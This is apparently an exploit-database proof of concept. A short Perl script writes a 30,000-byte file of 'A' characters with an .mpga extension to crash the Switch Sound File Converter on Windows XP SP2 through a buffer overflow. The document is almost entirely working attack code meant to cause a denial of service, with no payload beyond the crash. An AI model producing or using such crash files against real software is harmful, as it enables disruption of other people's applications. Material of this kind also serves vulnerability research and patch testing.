# Exploit Title: Switch Sound File Converter .mpga BOF DOS
# Date: 2009-1-1
# Author: Jacky
# Version: 0.0.0.0
# Tested on: Windows XP SP2
#Switch Sound File Converter .mpga BOF POS Vulnerability
#Discovered and written by : ( Jacky )
#Greetz to Corelan team and Peter Van Eeckhoutte !!!
#When you create a file that contains 30k of A's with .mpga extension , and load it then play it from Switch Sound File converter , it crashs !!!
my $file="Crash.mpga";
my $junk="A"x30000;
open(INI,">$file");
print INI $junk;
print "[+]File Created Successfully!\n";
print "[+]By Jacky!!!\n";
close(INI);
